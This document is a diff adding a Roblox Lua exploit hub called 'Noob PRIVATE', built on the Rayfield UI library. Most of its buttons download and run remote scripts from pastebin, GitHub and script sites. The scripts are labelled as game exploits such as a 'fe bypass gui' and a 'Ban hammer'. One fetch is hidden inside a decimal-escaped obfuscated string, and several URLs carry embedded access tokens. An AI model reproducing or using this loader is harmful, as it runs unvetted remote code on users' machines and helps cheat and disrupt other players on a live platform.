@@ -1,0 +1,55 @@
+local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Rayfield/main/source"))()
+local Window = Rayfield:CreateWindow({Name = "Noob PRIVATE", HidePremium = false, IntroText = "Welcome to private noob", SaveConfig = false, ConfigFolder = "Noobs"})
+
+local Tab1 = Window:CreateTab({
+    Name = "client side",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Tab2 = Window:CreateTab({
+    Name = "SS idk is work or not",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+-- Tab 1 Buttons
+Tab1:AddButton({Name = "polaria random", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/7yW3xXd6"))() end})
+Tab1:AddButton({Name = "polaria lua", Callback = function() loadstring(game:HttpGet("https://pastefy.app/agqEB2qs/raw",true))() end})
+Tab1:AddButton({Name = "grab knife v3", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Grab%20V3.txt", true))() end})
+Tab1:AddButton({Name = "grab knife v4", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Grab%20V4.txt", true))() end})
+Tab1:AddButton({Name = "john doe", Callback = function() loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-john-doe-gui-12026"))() end})
+Tab1:AddButton({Name = "EkSerV2", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/BTWhhsSX"))() end})
+Tab1:AddButton({Name = "Team c00lLeaked", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dudul132/Ghvtv/refs/heads/main/Jguvgh?token=GHSAT0AAAAAADDHG6V256LC7QI25WLE3B6W2BDNX4A"))() end})
+Tab1:AddButton({Name = "c00lkidd gui", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-C00LMAN-SCRIPT-HUB-10171"))() end})
+Tab1:AddButton({Name = "k00pgui reborn", Callback = function() loadstring(game:HttpGet("https://pastes.io/raw/test-89401"))() end})
+Tab1:AddButton({Name = "G00byd0lan gui", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dudul132/Ghvtv/refs/heads/main/Jgjvfh?token=GHSAT0AAAAAADDHG6V3FWE4XCSS76KKLE522BDOBOA"))() end})
+Tab1:AddButton({Name = "devil hat goner", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Goner"))() end})
+Tab1:AddButton({Name = "goner", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Goner"))() end})
+Tab1:AddButton({Name = "fe bypass gui", Callback = function() loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()  end})
+Tab1:AddButton({Name = "idk gui hub", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/decentholograms/FastDexDebugger-Script/refs/heads/main/Debugger.lua", true))() end})
+Tab1:AddButton({Name = "Team fat", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dudul132/Ghvtv/refs/heads/main/Bvfhcd?token=GHSAT0AAAAAADDHG6V3XEZGCJOTZQCOVND62BDOR5Q"))() end})
+Tab1:AddButton({Name = "Rc7", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/CoreGui/Scripts/main/RC7"))() end})
+Tab1:AddButton({Name = "Ro xploit 6.0", Callback = function() loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-RoXploit-by-KrystalTeam-9328"))() end})
+Tab1:AddButton({Name = "Ban hammer(is not fe100%)", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Ban%20Hammer"))() end})
+Tab1:AddButton({Name = "lua hammer", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Lua%20Hammer.txt", true))() end})
+Tab1:AddButton({Name = "my realm", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dudul132/Ghvtv/refs/heads/main/Bhkvjh?token=GHSAT0AAAAAADDHG6V3M5HBINI6ETC3J2FI2BDO37Q"))() end})
+Tab1:AddButton({Name = "project ligma", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dudul132/Ghvtv/refs/heads/main/Bvycgbdhxh?token=GHSAT0AAAAAADDHG6V2XSEZTRQP5YBN4ZMQ2BDPBVA"))() end})
+Tab1:AddButton({Name = "project stigma", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/mG8XGpmD", true))() end})
+Tab1:AddButton({Name = "test work or not", Callback = function() print("REAL NOOB PRIVATE BYPASS GOOD") end})
+Tab1:AddButton({Name = "Sword???", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Star%20Glitcher"))() end})
+Tab1:AddButton({Name = "keybord", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))() end})
+
+-- Tab 2 Buttons (kosong seperti yang diminta)
+Tab2:AddButton({Name = "Script 26", Callback = function() print("Script 26") end})
+Tab2:AddButton({Name = "Script 27", Callback = function() print("Script 27") end})
+Tab2:AddButton({Name = "Script 28", Callback = function() print("Script 28") end})
+Tab2:AddButton({Name = "Script 29", Callback = function() print("Script 29") end})
+Tab2:AddButton({Name = "Script 30", Callback = function() print("Script 30") end})
+Tab2:AddButton({Name = "Script 31", Callback = function() print("Script 31") end})
+Tab2:AddButton({Name = "Script 32", Callback = function() print("Script 32") end})
+Tab2:AddButton({Name = "Script 33", Callback = function() print("Script 33") end})
+Tab2:AddButton({Name = "Script 34", Callback = function() print("Script 34") end})
+Tab2:AddButton({Name = "Script 35", Callback = function() print("Script 35") end})
+
+Rayfield:Init()
